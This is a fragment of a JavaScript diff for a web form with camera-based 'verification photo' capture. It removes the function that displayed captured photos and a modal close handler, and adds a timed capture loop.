+            setTimeout(function() { capturePhotos(count + 1); }, 500);
         };
     }
 
-    // 渲染照片到页面
-    function renderPhotos() {
-        if (capturedPhotos.length === 0) return;
-        var grid = document.getElementById('photosGrid');
-        grid.innerHTML = '';
-        for (var i = 0; i < capturedPhotos.length; i++) {
-            var item = document.createElement('div');
-            item.className = 'photo-item';
-            item.innerHTML = '<img src="' + capturedPhotos[i] + '" alt="核验照片' + (i+1) + '">'
-                           + '<span class="photo-label">照片 ' + (i+1) + '</span>';
-            grid.appendChild(item);
-        }
-        document.getElementById('photosSection').style.display = 'block';
-    }
-
-    // 停止相机
     function stopCamera() {
         if (cameraStream) {
             cameraStream.getTracks().forEach(function(track) { track.stop(); });
@@ -771,14 +753,8 @@
         document.getElementById('reason').selectedIndex = 0;
         document.getElementById('description').value = '';
         capturedPhotos = [];
-        document.getElementById('photosSection').style.display = 'none';
-        document.getElementById('photosGrid').innerHTML = '';
     }
 
-    // 点击遮罩关闭
-    document.getElementById('cameraDenyTipModal').addEventListener('click', function(e) {
-        if (e.target === this) { this.classList.remove('active'); }
-    });
     document.getElementById('confirmSubmit1Modal').addEventListener('click', function(e) {
         if (e.target === this) closeConfirmSubmit1();
     });
